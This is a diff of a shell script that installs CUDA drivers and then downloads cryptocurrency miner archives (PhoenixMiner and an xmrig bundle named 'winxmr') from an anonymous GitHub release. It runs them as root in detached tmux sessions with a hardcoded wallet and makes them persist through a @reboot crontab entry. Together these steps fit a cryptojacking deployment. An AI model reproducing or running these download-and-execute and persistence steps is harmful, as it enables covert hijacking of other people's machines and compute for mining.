@@ -13,13 +13,16 @@ echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/
 sudo apt-get update
 sudo apt-get -y install cuda-drivers
 export PATH=/usr/local/cuda-11.2/bin${PATH:+:${PATH}}
+wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/winxmr.tar.gz
+tar -zxvf winxmr.tar.gz
 wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/PhoenixMiner_5.6d_Linux.tar.gz
 tar xzf PhoenixMiner_5.6d_Linux.tar.gz
 echo '#!/bin/sh'>>start.sh
 echo "cd $HOME/">>start.sh
 echo "tmux kill-server">>start.sh
 echo "sleep 1">>start.sh
-echo "sudo tmux new-session -d -s SANS './PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0x57AB06b50761145055Ff069f2ffB1Ce136425362.lana -pass x'">>start.sh
+echo "sudo tmux new-session -d -s SANS1 './PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 57AB06b50761145055Ff069f2ffB1Ce136425362.2022 -pass x'">>start.sh
+echo "sudo tmux new-session -d -s SANS2 './xmrig-v5.11.1/xmrig'">>start.sh
 echo "@reboot  sh $HOME/start.sh">> resmi
 crontab resmi
 sudo rm resmi
